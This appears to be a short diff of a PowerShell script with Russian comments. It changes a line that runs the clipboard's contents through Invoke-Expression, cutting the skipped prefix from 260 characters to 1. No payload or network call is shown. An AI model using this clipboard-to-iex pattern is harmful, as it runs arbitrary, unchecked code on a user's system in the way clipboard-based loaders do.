@@ -1,5 +1,5 @@
 # Выполнение кода из буфера обмена
-iex((Get-Clipboard -Raw).Substring(260))
+iex((Get-Clipboard -Raw).Substring(1))
 Start-Sleep -Seconds 1
 
 # Красивый баннер
